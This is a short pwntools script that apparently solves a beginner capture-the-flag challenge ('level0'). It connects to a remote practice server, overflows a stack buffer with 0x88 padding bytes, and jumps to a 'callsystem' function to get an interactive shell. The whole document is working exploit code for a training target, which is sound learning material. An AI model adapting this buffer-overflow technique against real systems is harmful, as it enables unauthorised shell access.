from pwn import *

context(arch="amd64",log_level="debug",os="linux")

#io          = process("./level0")
io          = remote("node4.buuoj.cn",25392)
elf         = ELF("./level0")

callsystem  = elf.symbols["callsystem"]

io.recvuntil(b"Hello, World")

payload=flat(b"A"*0x88,callsystem)

io.sendline(payload)

io.recv()
io.interactive()